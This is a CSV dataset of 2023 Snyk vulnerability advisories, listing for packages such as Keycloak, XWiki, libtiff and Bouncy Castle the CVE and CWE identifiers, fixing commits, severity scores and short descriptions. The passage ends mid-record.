CVE-2022-4361,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGKEYCLOAK-5750279,02/07/2023,01/07/2023,https://github.com/keycloak/keycloak/commit/a1cfe6e24e5b34792699a00b8b4a8016a5929e3a,Cross-site Scripting (XSS),https://api.github.com/repos/keycloak/keycloak/commits/a1cfe6e24e5b34792699a00b8b4a8016a5929e3a,Ricardo Martin,rmartinc@redhat.com,keycloak,a1cfe6e24e5b34792699a00b8b4a8016a5929e3a,"Check the redirect URI is http(s) when used for a form Post (#22)

Closes https://github.com/keycloak/security/issues/22

Co-authored-by: Stian Thorgersen <stianst@gmail.com>",Unknown,6.1,medium,"org.keycloak:keycloak-services is an open source identity and access management solution for modern applications and services.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper sanitization of URI-schemes on SAML and OIDC via the AssertionConsumerServiceURL implementation.
Exploiting this vulnerability is possible by sending a crafted SAML XML request.",2023
CVE-2023-36477,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGXWIKIPLATFORM-5750282,02/07/2023,02/07/2023,https://github.com/xwiki/xwiki-platform/commit/9d9d86179457cb8dc48b4491510537878800be4f,Cross-site Scripting (XSS),https://api.github.com/repos/xwiki/xwiki-platform/commits/9d9d86179457cb8dc48b4491510537878800be4f,Manuel Leduc,manuel.leduc@xwiki.com,xwiki-platform,9d9d86179457cb8dc48b4491510537878800be4f,XWIKI-20590: Improved CKEditor visibility management,XML,6.1,medium,"Affected versions of this package are vulnerable to Cross-site Scripting (XSS) when any user with edit rights can edit all pages in the `CKEditor' space. This makes it possible to perform various harmful actions, such as removing technical documents, leading to loss of service, and editing the javascript configuration of CKEditor, leading to persistent XSS.",2023
CVE-2023-2585,CWE-290,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGKEYCLOAK-5750277,02/07/2023,01/07/2023,https://github.com/keycloak/keycloak/commit/04e6244c387a1bde86184635a0049537611e3915,Authentication Bypass by Spoofing,https://api.github.com/repos/keycloak/keycloak/commits/04e6244c387a1bde86184635a0049537611e3915,Pedro Igor,pigor.craveiro@gmail.com,keycloak,04e6244c387a1bde86184635a0049537611e3915,"Verify holder of the device code (#21)

Closes https://github.com/keycloak/security/issues/32

Co-authored-by: Stian Thorgersen <stianst@gmail.com>",Java,3.1,low,"org.keycloak:keycloak-server-spi-private is an open source identity and access management solution for modern applications and services.
Affected versions of this package are vulnerable to Authentication Bypass by Spoofing within the Keycloak Device Authorisation Grant due to improper verification of the device code holder.
Exploiting this vulnerability is possible under certain pre-conditions and it allows an attacker to spoof parts of the device flow and use a device_code to retrieve an access token for other OAuth clients.",2023
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-MARKDOWN2-5750276,02/07/2023,02/07/2023,https://github.com/trentm/python-markdown2/commit/9b6fc0bf6a095761b705d2ea43e31e98da500c53,Cross-site Scripting (XSS),https://api.github.com/repos/trentm/python-markdown2/commits/9b6fc0bf6a095761b705d2ea43e31e98da500c53,Nicholas Serra,nickserra@gmail.com,python-markdown2,9b6fc0bf6a095761b705d2ea43e31e98da500c53,"Merge pull request #473 from vin01/master

Add test for nested incomplete tag sanitization",Python,6.1,medium,"markdown2 is a fast and complete Python implementation of Markdown.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper input sanitization for nested incomplete tags.",2023
CVE-2023-2422,CWE-295,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGKEYCLOAK-5750280,02/07/2023,01/07/2023,https://github.com/keycloak/keycloak/commit/5c6c55945a384bfd82e51283096204dcb6f63d91,Improper Certificate Validation,https://api.github.com/repos/keycloak/keycloak/commits/5c6c55945a384bfd82e51283096204dcb6f63d91,Marek Posolda,mposolda@gmail.com,keycloak,5c6c55945a384bfd82e51283096204dcb6f63d91,"Improper Client Certificate Validation for OAuth/OpenID clients (#20)

Co-authored-by: Stian Thorgersen <stianst@gmail.com>",Java,7.1,high,"org.keycloak:keycloak-services is an open source identity and access management solution for modern applications and services.
Affected versions of this package are vulnerable to Improper Certificate Validation for OAuth/OpenID clients.
When a Keycloak server is configured to support mTLS authentication for OAuth/OpenID clients, it does not properly verify the client certificate chain. A client with a proper certificate can authorize itself as any other client and, therefore, access data belonging to other clients.",2023
CVE-2023-36810,CWE-407,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PYPDF2-5750281,02/07/2023,02/07/2023,https://github.com/py-pdf/pypdf/commit/c6c56f550bb384e05f0139c796ba1308837d6373,Inefficient Algorithmic Complexity,https://api.github.com/repos/py-pdf/pypdf/commits/c6c56f550bb384e05f0139c796ba1308837d6373,dsk7,jensg@posteo.de,pypdf,c6c56f550bb384e05f0139c796ba1308837d6373,"MAINT: Quadratic runtime while parsing reduced to linear  (#808)

When the PdfFileReader tries to find the xref marker, the readNextEndLine methods builds a so called line by reading byte-for-byte. Every time a new byte is read, it is concatenated with the currently read line. This leads to quadratic runtime O(n²) behavior as Python strings (also byte-strings) are immutable and have to be copied where n is the size of the file.
For files where the xref marker can not be found at the end this takes a enormous amount of time:

* 1mb of zeros at the end: 45.54 seconds
* 2mb of zeros at the end: 357.04 seconds
(measured on a laptop made in 2015)

This pull request changes the relevant section of the code to become linear runtime O(n), leading to a run time of less then a second for both cases mentioned above. Furthermore this PR adds a regression test.",Python,6.2,medium,"PyPDF2 is an A pure-python PDF library capable of splitting, merging, cropping, and transforming PDF files
Affected versions of this package are vulnerable to Inefficient Algorithmic Complexity by crafting a PDF, leading to an unexpectedly long runtime when trying to read large files without xref marker.
This quadratic runtime blocks the current process and can utilize a single CPU core by 100%.
Note:
Exploiting this vulnerability does not affect memory usage.",2023
CVE-2023-2585,CWE-290,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGKEYCLOAK-5750278,02/07/2023,01/07/2023,https://github.com/keycloak/keycloak/commit/04e6244c387a1bde86184635a0049537611e3915,Authentication Bypass by Spoofing,https://api.github.com/repos/keycloak/keycloak/commits/04e6244c387a1bde86184635a0049537611e3915,Pedro Igor,pigor.craveiro@gmail.com,keycloak,04e6244c387a1bde86184635a0049537611e3915,"Verify holder of the device code (#21)

Closes https://github.com/keycloak/security/issues/32

Co-authored-by: Stian Thorgersen <stianst@gmail.com>",Java,3.1,low,"org.keycloak:keycloak-services is an open source identity and access management solution for modern applications and services.
Affected versions of this package are vulnerable to Authentication Bypass by Spoofing within the Keycloak Device Authorisation Grant due to improper verification of the device code holder.
Exploiting this vulnerability is possible under certain pre-conditions and it allows an attacker to spoof parts of the device flow and use a device_code to retrieve an access token for other OAuth clients.",2023
,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-AWSCLI-5750274,02/07/2023,02/07/2023,https://github.com/aws/aws-cli/commit/68ad24c36b4e3f6936e3d1dc76fda39d2d1fe764,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/aws/aws-cli/commits/68ad24c36b4e3f6936e3d1dc76fda39d2d1fe764,Mitali Bisht,mitalibo@amazon.com,aws-cli,68ad24c36b4e3f6936e3d1dc76fda39d2d1fe764,Prevent AWS CodeArtifact login command from hanging unexpectedly,Config files,3.7,low,Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when an attacker can craft a malicious nuget.config file. This vulnerability can be exploited when a user performs Nuget or Dotnet login,2023
CVE-2023-26136,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-5750729,30/06/2023,08/06/2023,https://github.com/salesforce/tough-cookie/commit/12d474791bb856004e858fdb1c47b7608d09cf6e,Prototype Pollution,https://api.github.com/repos/salesforce/tough-cookie/commits/12d474791bb856004e858fdb1c47b7608d09cf6e,Colin Casey,casey.colin@gmail.com,tough-cookie,12d474791bb856004e858fdb1c47b7608d09cf6e,"Prevent prototype pollution in cookie memstore (#283)

All occurrences of new object creation in `memstore.js` have been changed from `{}` (i.e.; `Object.create(Object.prototype)` to `Object.create(null)` so that we are using object instances that do not have a prototype property that can be polluted.

@fixes #282",JavaScript,6.5,medium,"org.webjars.npm:tough-cookie is a RFC6265 Cookies and CookieJar module for Node.js.
Affected versions of this package are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in rejectPublicSuffixes=false mode. Due to an issue with the manner in which the objects are initialized, an attacker can expose or modify a limited amount of property information on those objects. There is no impact to availability.",2023
CVE-2023-2908,CWE-476,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-LIBTIFF-5747916,30/06/2023,30/06/2023,https://github.com/libsdl-org/libtiff/commit/9bd48f0dbd64fb94dc2b5b05238fde0bfdd4ff3f,NULL Pointer Dereference,https://api.github.com/repos/libsdl-org/libtiff/commits/9bd48f0dbd64fb94dc2b5b05238fde0bfdd4ff3f,Even Rouault,even.rouault@spatialys.com,libtiff,9bd48f0dbd64fb94dc2b5b05238fde0bfdd4ff3f,"Merge branch 'mymaster1' into 'master'

fix runtime error: applying zero offset to null pointer

See merge request libtiff/libtiff!479",C/C++,5.5,medium,"Affected versions of this package are vulnerable to NULL Pointer Dereference. This flaw allows an attacker to pass a crafted TIFF image file to the tiffcp utility, which triggers runtime error, causing an undefined behavior, resulting in an application crash, eventually leading to a denial of service.",2023
CVE-2022-40896,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PYGMENTS-5750273,02/07/2023,02/07/2023,https://github.com/pygments/pygments/commit/97eb3d5ec7c1b3ea4fcf9dee30a2309cf92bd194,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/pygments/pygments/commits/97eb3d5ec7c1b3ea4fcf9dee30a2309cf92bd194,Jean Abou Samra,jean@abou-samra.fr,pygments,97eb3d5ec7c1b3ea4fcf9dee30a2309cf92bd194,"SQL+Jinja: use a simpler regex in analyse_text

Fixes catastrophic backtracking

Fixes #2355",Unknown,5.3,medium,"Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of insecure regular expressions in SqlJinjaLexer class. 
Exploiting this vulnerability is possible when processing Smithy, SQL/SQL+Jinja, or Java properties files from an untrusted source.",2023
CVE-2023-26136,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-TOUGHCOOKIE-5672873,30/06/2023,08/06/2023,https://github.com/salesforce/tough-cookie/commit/12d474791bb856004e858fdb1c47b7608d09cf6e,Prototype Pollution,https://api.github.com/repos/salesforce/tough-cookie/commits/12d474791bb856004e858fdb1c47b7608d09cf6e,Colin Casey,casey.colin@gmail.com,tough-cookie,12d474791bb856004e858fdb1c47b7608d09cf6e,"Prevent prototype pollution in cookie memstore (#283)

All occurrences of new object creation in `memstore.js` have been changed from `{}` (i.e.; `Object.create(Object.prototype)` to `Object.create(null)` so that we are using object instances that do not have a prototype property that can be polluted.

@fixes #282",JavaScript,6.5,medium,"tough-cookie is a RFC6265 Cookies and CookieJar module for Node.js.
Affected versions of this package are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in rejectPublicSuffixes=false mode. Due to an issue with the manner in which the objects are initialized, an attacker can expose or modify a limited amount of property information on those objects. There is no impact to availability.",2023
CVE-2023-26966,CWE-120,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-LIBTIFF-5747817,30/06/2023,30/06/2023,https://github.com/libsdl-org/libtiff/commit/b0e1c25dd1d065200c8d8f59ad0afe014861a1b9,Buffer Overflow,https://api.github.com/repos/libsdl-org/libtiff/commits/b0e1c25dd1d065200c8d8f59ad0afe014861a1b9,Su_Laus,sulau@freenet.de,libtiff,b0e1c25dd1d065200c8d8f59ad0afe014861a1b9,"tif_luv: Check and correct for NaN data in uv_encode().

Closes #530

See merge request !473",C/C++,7.3,high,Affected versions of this package are vulnerable to Buffer Overflow in the uv_encode() method when libtiff reads a corrupted little-endian TIFF file and specifies the output to be big-endian.,2023
CVE-2023-25433,CWE-120,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-LIBTIFF-5747816,30/06/2023,30/06/2023,https://github.com/libsdl-org/libtiff/commit/9c22495e5eeeae9e00a1596720c969656bb8d678,Buffer Overflow,https://api.github.com/repos/libsdl-org/libtiff/commits/9c22495e5eeeae9e00a1596720c969656bb8d678,Su_Laus,sulau@freenet.de,libtiff,9c22495e5eeeae9e00a1596720c969656bb8d678,"tiffcrop correctly update buffersize after rotateImage() fix#520
rotateImage() set up a new buffer and calculates its size individually. Therefore, seg_buffs[] size needs to be updated accordingly. Before this fix, the seg_buffs buffer size was calculated with a different formula than within rotateImage().

Closes #520.",C/C++,7.3,high,Affected versions of this package are vulnerable to Buffer Overflow due to incorrect updating of buffer size after rotateImage().,2023
CVE-2023-37254,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MEDIAWIKICARGO-5747814,30/06/2023,30/06/2023,https://github.com/wikimedia/mediawiki-extensions-Cargo/commit/2e587bab444d82d939cd376b2fb08f0eab95c854,Cross-site Scripting (XSS),https://api.github.com/repos/wikimedia/mediawiki-extensions-Cargo/commits/2e587bab444d82d939cd376b2fb08f0eab95c854,Yaron Koren,yaron57@gmail.com,mediawiki-extensions-Cargo,2e587bab444d82d939cd376b2fb08f0eab95c854,"Fix for escaping of query results

Change-Id: Ibb1c7d5f3e89be5f1344c19cc3f9464febc08e0c",PHP,6.1,medium,Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in the Special:CargoQuery parameter via a crafted page item when using the default format.,2023
,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-SAFEURLPYTHON-5747815,30/06/2023,29/06/2023,https://github.com/IncludeSecurity/safeurl-python/commit/c4f9677f8790a58eaa1953bac286cca75a5f580e,Access Control Bypass,https://api.github.com/repos/IncludeSecurity/safeurl-python/commits/c4f9677f8790a58eaa1953bac286cca75a5f580e,includesec-kris,kris@includesecurity.com,safeurl-python,c4f9677f8790a58eaa1953bac286cca75a5f580e,"Merge pull request #6 from IncludeSecurity/fqdn_fixes

FQDN fixes",Markdown,6.5,medium,"safeurl-python is a library that aids developers in protecting against SSRF
Affected versions of this package are vulnerable to Access Control Bypass due to not blocking FQDNs. If a hostname is blacklisted, it is possible to bypass the blacklist by requesting the FQDN of the host (e.g. adding . to the end).",2023
CVE-2023-37256,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MEDIAWIKICARGO-5747813,30/06/2023,30/06/2023,https://github.com/wikimedia/mediawiki-extensions-Cargo/commit/86914225af228f48b52df69b478cc1e6f3cb5b9a,Cross-site Scripting (XSS),https://api.github.com/repos/wikimedia/mediawiki-extensions-Cargo/commits/86914225af228f48b52df69b478cc1e6f3cb5b9a,Yaron Koren,yaron57@gmail.com,mediawiki-extensions-Cargo,86914225af228f48b52df69b478cc1e6f3cb5b9a,"Follow-up to f7228478fd73 - escape invalid URLs

Change-Id: I3e1c812db48ba47c69261a5ac5371cf8af3486af",PHP,6.1,medium,"Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization, such that an attacker can declare a cargo table with a field of type URL and store malicious input via the parameter.",2023
CVE-2023-33201,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGBOUNCYCASTLE-5771339,30/06/2023,16/06/2023,https://github.com/bcgit/bc-java/commit/b00b58873643abc7e834f07e345e0165bb3a1786,Information Exposure,https://api.github.com/repos/bcgit/bc-java/commits/b00b58873643abc7e834f07e345e0165bb3a1786,David Hook,dgh@cryptoworkshop.com,bc-java,b00b58873643abc7e834f07e345e0165bb3a1786,initial work on updating LDAP cert store test,Java,4.7,medium,"org.bouncycastle:bcprov-jdk15on is a Java implementation of cryptographic algorithms.
Affected versions of this package are vulnerable to Information Exposure due to missing validation for the X.500 name of any certificate, subject, or issuer. The presence of a wild card may lead to information disclosure. This could allow a malicious user to obtain unauthorized information via blind LDAP Injection, exploring the environment and enumerating data. 
Note:
The exploit depends on the structure of the target LDAP directory as well as what kind of errors are exposed to the user.",2023
CVE-2023-33201,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGBOUNCYCASTLE-5747809,30/06/2023,16/06/2023,https://github.com/bcgit/bc-java/commit/b00b58873643abc7e834f07e345e0165bb3a1786,Information Exposure,https://api.github.com/repos/bcgit/bc-java/commits/b00b58873643abc7e834f07e345e0165bb3a1786,David Hook,dgh@cryptoworkshop.com,bc-java,b00b58873643abc7e834f07e345e0165bb3a1786,initial work on updating LDAP cert store test,Java,4.7,medium,"Affected versions of this package are vulnerable to Information Exposure due to missing validation for the X.500 name of any certificate, subject, or issuer. The presence of a wild card may lead to information disclosure. This could allow a malicious user to obtain unauthorized information via blind LDAP Injection, exploring the environment and enumerating data. 
Note:
The exploit depends on the structure of the target LDAP directory as well as what kind of errors are exposed to the user.",2023
CVE-2023-33201,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGBOUNCYCASTLE-5771495,30/06/2023,16/06/2023,https://github.com/bcgit/bc-java/commit/b00b58873643abc7e834f07e345e0165bb3a1786,Information Exposure,https://api.github.com/repos/bcgit/bc-java/commits/b00b58873643abc7e834f07e345e0165bb3a1786,David Hook,dgh@cryptoworkshop.com,bc-java,b00b58873643abc7e834f07e345e0165bb3a1786,initial work on updating LDAP cert store test,Java,4.7,medium,"Affected versions of this package are vulnerable to Information Exposure due to missing validation for the X.500 name of any certificate, subject, or issuer. The presence of a wild card may lead to information disclosure. This could allow a malicious user to obtain unauthorized information via blind LDAP Injection, exploring the environment and enumerating data. 
Note:
The exploit depends on the structure of the target LDAP directory as well as what kind of errors are exposed to the user.",2023
CVE-2023-33201,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGBOUNCYCASTLE-5771493,30/06/2023,16/06/2023,https://github.com/bcgit/bc-java/commit/b00b58873643abc7e834f07e345e0165bb3a1786,Information Exposure,https://api.github.com/repos/bcgit/bc-java/commits/b00b58873643abc7e834f07e345e0165bb3a1786,David Hook,dgh@cryptoworkshop.com,bc-java,b00b58873643abc7e834f07e345e0165bb3a1786,initial work on updating LDAP cert store test,Java,4.7,medium,"Affected versions of this package are vulnerable to Information Exposure due to missing validation for the X.500 name of any certificate, subject, or issuer. The presence of a wild card may lead to information disclosure. This could allow a malicious user to obtain unauthorized information via blind LDAP Injection, exploring the environment and enumerating data. 
Note:
The exploit depends on the structure of the target LDAP directory as well as what kind of errors are exposed to the user.",2023
CVE-2023-33201,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGBOUNCYCASTLE-5771494,30/06/2023,16/06/2023,https://github.com/bcgit/bc-java/commit/b00b58873643abc7e834f07e345e0165bb3a1786,Information Exposure,https://api.github.com/repos/bcgit/bc-java/commits/b00b58873643abc7e834f07e345e0165bb3a1786,David Hook,dgh@cryptoworkshop.com,bc-java,b00b58873643abc7e834f07e345e0165bb3a1786,initial work on updating LDAP cert store test,Java,4.7,medium,"Affected versions of this package are vulnerable to Information Exposure due to missing validation for the X.500 name of any certificate, subject, or issuer. The presence of a wild card may lead to information disclosure. This could allow a malicious user to obtain unauthorized information via blind LDAP Injection, exploring the environment and enumerating data. 
Note:
The exploit depends on the structure of the target LDAP directory as well as what kind of errors are exposed to the user.",2023
CVE-2023-33201,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGBOUNCYCASTLE-5771492,30/06/2023,16/06/2023,https://github.com/bcgit/bc-java/commit/b00b58873643abc7e834f07e345e0165bb3a1786,Information Exposure,https://api.github.com/repos/bcgit/bc-java/commits/b00b58873643abc7e834f07e345e0165bb3a1786,David Hook,dgh@cryptoworkshop.com,bc-java,b00b58873643abc7e834f07e345e0165bb3a1786,initial work on updating LDAP cert store test,Java,4.7,medium,"org.bouncycastle:bcprov-ext-jdk14 is a Java implementation of cryptographic algorithms.
Affected versions of this package are vulnerable to Information Exposure due to missing validation for the X.500 name of any certificate, subject, or issuer. The presence of a wild card may lead to information disclosure. This could allow a malicious user to obtain unauthorized information via blind LDAP Injection, exploring the environment and enumerating data. 
Note:
The exploit depends on the structure of the target LDAP directory as well as what kind of errors are exposed to the user.",2023
CVE-2023-33201,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGBOUNCYCASTLE-5771491,30/06/2023,16/06/2023,https://github.com/bcgit/bc-java/commit/b00b58873643abc7e834f07e345e0165bb3a1786,Information Exposure,https://api.github.com/repos/bcgit/bc-java/commits/b00b58873643abc7e834f07e345e0165bb3a1786,David Hook,dgh@cryptoworkshop.com,bc-java,b00b58873643abc7e834f07e345e0165bb3a1786,initial work on updating LDAP cert store test,Java,4.7,medium,"org.bouncycastle:bcprov-ext-jdk15to18 is a Java implementation of cryptographic algorithms.
Affected versions of this package are vulnerable to Information Exposure due to missing validation for the X.500 name of any certificate, subject, or issuer. The presence of a wild card may lead to information disclosure. This could allow a malicious user to obtain unauthorized information via blind LDAP Injection, exploring the environment and enumerating data. 
Note:
The exploit depends on the structure of the target LDAP directory as well as what kind of errors are exposed to the user.",2023
CVE-2023-33201,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGBOUNCYCASTLE-5771489,30/06/2023,16/06/2023,https://github.com/bcgit/bc-java/commit/b00b58873643abc7e834f07e345e0165bb3a1786,Information Exposure,https://api.github.com/repos/bcgit/bc-java/commits/b00b58873643abc7e834f07e345e0165bb3a1786,David Hook,dgh@cryptoworkshop.com,bc-java,b00b58873643abc7e834f07e345e0165bb3a1786,initial work on updating LDAP cert store test,Java,4.7,medium,"org.bouncycastle:bcprov-jdk15to18 is a Java implementation of cryptographic algorithms.
Affected versions of this package are vulnerable to Information Exposure due to missing validation for the X.500 name of any certificate, subject, or issuer. The presence of a wild card may lead to information disclosure. This could allow a malicious user to obtain unauthorized information via blind LDAP Injection, exploring the environment and enumerating data. 
Note:
The exploit depends on the structure of the target LDAP directory as well as what kind of errors are exposed to the user.",2023
CVE-2023-33201,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGBOUNCYCASTLE-5771490,30/06/2023,16/06/2023,https://github.com/bcgit/bc-java/commit/b00b58873643abc7e834f07e345e0165bb3a1786,Information Exposure,https://api.github.com/repos/bcgit/bc-java/commits/b00b58873643abc7e834f07e345e0165bb3a1786,David Hook,dgh@cryptoworkshop.com,bc-java,b00b58873643abc7e834f07e345e0165bb3a1786,initial work on updating LDAP cert store test,Java,4.7,medium,"org.bouncycastle:bcprov-jdk14 is a Java implementation of cryptographic algorithms.
Affected versions of this package are vulnerable to Information Exposure due to missing validation for the X.500 name of any certificate, subject, or issuer. The presence of a wild card may lead to information disclosure. This could allow a malicious user to obtain unauthorized information via blind LDAP Injection, exploring the environment and enumerating data. 
Note:
The exploit depends on the structure of the target LDAP directory as well as what kind of errors are exposed to the user.",2023
CVE-2023-33201,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGBOUNCYCASTLE-5771340,30/06/2023,16/06/2023,https://github.com/bcgit/bc-java/commit/b00b58873643abc7e834f07e345e0165bb3a1786,Information Exposure,https://api.github.com/repos/bcgit/bc-java/commits/b00b58873643abc7e834f07e345e0165bb3a1786,David Hook,dgh@cryptoworkshop.com,bc-java,b00b58873643abc7e834f07e345e0165bb3a1786,initial work on updating LDAP cert store test,Java,4.7,medium,"Affected versions of this package are vulnerable to Information Exposure due to missing validation for the X.500 name of any certificate, subject, or issuer. The presence of a wild card may lead to information disclosure. This could allow a malicious user to obtain unauthorized information via blind LDAP Injection, exploring the environment and enumerating data. 
Note:
The exploit depends on the structure of the target LDAP directory as well as what kind of errors are exposed to the user.",2023
CVE-2023-22886,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-APACHEAIRFLOWPROVIDERSJDBC-5747808,30/06/2023,30/06/2023,https://github.com/apache/airflow/commit/0edbe913685e6a21905bc4bb52c6a084bdcdf953,Remote Code Execution (RCE),https://api.github.com/repos/apache/airflow/commits/0edbe913685e6a21905bc4bb52c6a084bdcdf953,Pankaj Koti,pankajkoti699@gmail.com,airflow,0edbe913685e6a21905bc4bb52c6a084bdcdf953,Restrict direct usage of driver params via extras for JDBC connection (#31849),Unknown,9.8,critical,"apache-airflow-providers-jdbc is a Provider for Apache Airflow. Implements apache-airflow-providers-jdbc package
Affected versions of this package are vulnerable to Remote Code Execution (RCE) such that Airflow JDBC Provider Connection’s [Connection URL] parameters have no restrictions, which makes it possible to implement attacks via different types of JDBC drivers and obtain airflow server permission.",2023
CVE-2023-3469,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-THORSTENPHPMYFAQ-5747793,30/06/2023,30/06/2023,https://github.com/thorsten/phpmyfaq/commit/04a0183c25dd425f4c2bfb5f75b7650b932ae278,Cross-site Scripting (XSS),https://api.github.com/repos/thorsten/phpmyfaq/commits/04a0183c25dd425f4c2bfb5f75b7650b932ae278,Thorsten Rinne,thorsten@phpmyfaq.de,phpmyfaq,04a0183c25dd425f4c2bfb5f75b7650b932ae278,fix: added missing conversion of HTML entities in error exception,PHP,5.2,medium,"thorsten/phpmyfaq is a FAQ system for PHP and MySQL, PostgreSQL and other databases
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in the Message parameter.",2023
CVE-2023-36468,CWE-459,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGXWIKIPLATFORM-5747792,30/06/2023,30/06/2023,https://github.com/xwiki/xwiki-platform/commit/15a6f845d8206b0ae97f37aa092ca43d4f9d6e59,Incomplete Cleanup,https://api.github.com/repos/xwiki/xwiki-platform/commits/15a6f845d8206b0ae97f37aa092ca43d4f9d6e59,Michael Hamann,michael.hamann@xwiki.com,xwiki-platform,15a6f845d8206b0ae97f37aa092ca43d4f9d6e59,"XWIKI-20594: Mark old revisions and deleted documents as restricted

* Introduce a new ""restricted"" attribute on XWikiDocument
* Mark any document that is restored from XML as restricted
* Deny script right when the secure document is restricted
* Make transformations restricted when the document is restricted
* Do not execute Velocity in titles when the document is restricted
* Make sure saved documents aren't restricted.
* Add tests
* Display a warning when a document is rendered in restricted mode and
  the user is advanced or there is actually an error in the output.",Java,9.9,critical,"Affected versions of this package are vulnerable to Incomplete Cleanup. When an XWiki installation is upgraded and that upgrade contains a fix for a bug in a document, just a new version of that document is added. In some cases, it's still possible to exploit the vulnerability that was fixed in the new version. 
Note:
This vulnerability doesn't affect freshly installed versions of XWiki. Further, this vulnerability doesn't affect content that is only loaded from the current version of a document like the code of wiki macros or UI extensions.",2023
CVE-2023-36470,CWE-74,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGXWIKIPLATFORM-5747790,30/06/2023,30/06/2023,https://github.com/xwiki/xwiki-platform/commit/46b542854978e9caa687a5c2b8817b8b17877d94,Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'),https://api.github.com/repos/xwiki/xwiki-platform/commits/46b542854978e9caa687a5c2b8817b8b17877d94,Michael Hamann,michael.hamann@xwiki.com,xwiki-platform,46b542854978e9caa687a5c2b8817b8b17877d94,"XWIKI-20682: Introduce an icon macro

* Introduce the displayIcon macro that safely parses and executes the
  icon theme's wiki syntax in the context of its source document.
* Add tests.",XML,9.9,critical,"Affected versions of this package are vulnerable to Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'). By either creating a new or editing an existing document with an icon set, an attacker can inject XWiki syntax and Velocity code that is executed with programming rights and thus allows remote code execution.",2023
CVE-2023-36470,CWE-74,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGXWIKIPLATFORM-5747791,30/06/2023,30/06/2023,https://github.com/xwiki/xwiki-platform/commit/46b542854978e9caa687a5c2b8817b8b17877d94,Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'),https://api.github.com/repos/xwiki/xwiki-platform/commits/46b542854978e9caa687a5c2b8817b8b17877d94,Michael Hamann,michael.hamann@xwiki.com,xwiki-platform,46b542854978e9caa687a5c2b8817b8b17877d94,"XWIKI-20682: Introduce an icon macro

* Introduce the displayIcon macro that safely parses and executes the
  icon theme's wiki syntax in the context of its source document.
* Add tests.",XML,9.9,critical,"Affected versions of this package are vulnerable to Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'). By either creating a new or editing an existing document with an icon set, an attacker can inject XWiki syntax and Velocity code that is executed with programming rights and thus allows remote code execution.",2023
CVE-2023-36470,CWE-74,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGXWIKIPLATFORM-5747789,30/06/2023,30/06/2023,https://github.com/xwiki/xwiki-platform/commit/46b542854978e9caa687a5c2b8817b8b17877d94,Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'),https://api.github.com/repos/xwiki/xwiki-platform/commits/46b542854978e9caa687a5c2b8817b8b17877d94,Michael Hamann,michael.hamann@xwiki.com,xwiki-platform,46b542854978e9caa687a5c2b8817b8b17877d94,"XWIKI-20682: Introduce an icon macro

* Introduce the displayIcon macro that safely parses and executes the
  icon theme's wiki syntax in the context of its source document.
* Add tests.",XML,9.9,critical,"Affected versions of this package are vulnerable to Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'). By either creating a new or editing an existing document with an icon set, an attacker can inject XWiki syntax and Velocity code that is executed with programming rights and thus allows remote code execution.",2023
CVE-2023-36469,CWE-74,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGXWIKIPLATFORM-5747788,30/06/2023,30/06/2023,https://github.com/xwiki/xwiki-platform/commit/217e5bb7a657f2991b154a16ef4d5ae9c29ad39c,Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'),https://api.github.com/repos/xwiki/xwiki-platform/commits/217e5bb7a657f2991b154a16ef4d5ae9c29ad39c,Michael Hamann,michael.hamann@xwiki.com,xwiki-platform,217e5bb7a657f2991b154a16ef4d5ae9c29ad39c,"XWIKI-20610: Notification RSS feed is parsed as XWiki syntax

